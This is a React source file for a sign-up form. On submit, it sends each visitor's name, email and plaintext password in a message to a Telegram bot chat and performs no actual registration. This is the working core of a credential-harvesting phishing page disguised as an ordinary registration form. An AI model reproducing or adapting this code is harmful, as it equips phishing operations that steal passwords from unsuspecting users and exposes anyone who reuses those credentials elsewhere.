import React, { useCallback, useState } from "react";
import { Button, TextField } from "@mui/material";
import styled from "@/DefaultTheme";
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from "@/common/constant";

export const SignUp = () => {
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    password: "",
  });

  const handleChange = useCallback(
    (e: React.ChangeEvent<HTMLInputElement>) => {
      setFormData({ ...formData, [e.target.name]: e.target.value });
    },
    [formData],
  );

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    const message = `New Registration:
    UserName: ${formData.name}
    Email: ${formData.email}
    Password: ${formData.password}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });
  };

  return (
    <Root>
      <FormContainer onSubmit={handleSubmit}>
        <TextField
          name="name"
          placeholder="Name"
          variant="outlined"
          fullWidth
          margin="normal"
          onChange={handleChange}
        />
        <TextField
          name="email"
          placeholder="Email"
          variant="outlined"
          fullWidth
          margin="normal"
          type="email"
          onChange={handleChange}
        />
        <TextField
          name="password"
          placeholder="Password"
          variant="outlined"
          fullWidth
          margin="normal"
          type="password"
          onChange={handleChange}
        />
        <StyledButton type="submit" fullWidth>
          Registration
        </StyledButton>
      </FormContainer>
    </Root>
  );
};

const Root = styled("div")(({ theme }) => ({
  display: "flex",
  flexDirection: "column",
  alignItems: "center",
  justifyContent: "center",
  width: "100%",
  backgroundColor: theme.palette.primary.main,
  color: theme.palette.secondary.main,
  minHeight: "711px",
}));

const FormContainer = styled("form")({
  display: "flex",
  flexDirection: "column",
  alignItems: "center",
  justifyContent: "center",
  width: "346px",
});

const StyledButton = styled(Button)(({ theme }) => ({
  backgroundColor: theme.palette.secondary.main,
  color: theme.palette.error.main,
  marginTop: "1rem",
}));
